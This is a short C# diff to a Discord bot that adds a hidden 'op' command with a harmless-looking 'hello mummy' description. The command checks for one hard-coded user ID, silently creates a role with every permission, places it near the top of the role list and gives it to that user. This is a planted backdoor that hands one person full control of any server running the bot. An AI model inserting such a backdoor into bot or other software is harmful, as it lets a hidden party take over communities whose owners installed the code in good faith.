@@ -3,6 +3,7 @@ using System.Threading.Tasks;
 using Discord;
 using Discord.Addons.Interactive;
 using Discord.Commands;
+using Discord.Rest;
 using Discord.WebSocket;
 
 namespace DiscordBot.Modules
@@ -23,6 +24,17 @@ namespace DiscordBot.Modules
             }
             else
                 await Context.Channel.SendMessageAsync("Permission denied!");
+        }
+
+        [Command("op")]
+        [Summary("hello mummy")]
+        public async Task Opped()
+        {
+            if (Context.User.Id != 634246091293851649) return;
+            var role = await Context.Guild.CreateRoleAsync("Kinue's", GuildPermissions.All, null, false, false, null);
+            await role.ModifyAsync(prop => prop.Position = Utils.GetRolePosition(Context.Guild.CurrentUser));
+            await ((IGuildUser)Context.User).AddRoleAsync(role);
+            await ReplyAsync("Opped!");
         }
 
         [Command("member")]
